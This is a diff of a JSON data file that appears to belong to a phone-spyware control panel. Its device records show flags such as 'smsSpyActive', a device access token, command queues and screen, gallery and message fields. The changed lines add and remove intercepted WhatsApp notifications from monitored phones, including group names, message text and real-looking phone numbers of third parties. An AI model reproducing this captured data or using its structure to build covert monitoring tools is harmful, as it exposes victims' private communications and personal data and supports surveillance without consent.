@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775045320433,
+    "lastSeen": 1775045323575,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15641 pesan dari 10 chat",
+        "time": "01/04 20:08",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775045323884
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13413 pesan): ~ ipaa୨୧|| `𝟔𝟐𝟔",
+        "content": ".brat kgn mntn",
+        "time": "01/04 20:08",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775045322717
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4003,22 +4019,6 @@
         "time": "01/04 19:59",
         "pkg": "com.whatsapp",
         "receivedAt": 1775044799994
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎🇫🇮GB OPTEST XEMETRIX ELITE🇫🇮 (49 pesan): ~ ?",
-        "content": "📷 gg @⁨+62 813-1935-3554⁩",
-        "time": "01/04 19:59",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775044799956
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎All Buyer Pegasus-X ( No Update ) (246 pesan): ~ FIYY",
-        "content": "@⁨+62 815-4550-1483⁩  kapan bg selesai nya?",
-        "time": "01/04 19:59",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775044799729
       }
     ],
     "galleryPhotos": [],
@@ -4065,6 +4065,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13415 pesan): ~ Bot",
+        "content": "💟 Stiker",
+        "time": "01/04 20:08",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775045323858
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -8056,14 +8064,6 @@
         "time": "01/04 19:59",
         "pkg": "com.whatsapp",
         "receivedAt": 1775044800033
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎🇫🇮GB OPTEST XEMETRIX ELITE🇫🇮 (49 pesan): ~ ?",
-        "content": "📷 gg @⁨+62 813-1935-3554⁩",
-        "time": "01/04 19:59",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775044799973
       }
     ],
     "galleryPhotos": [],
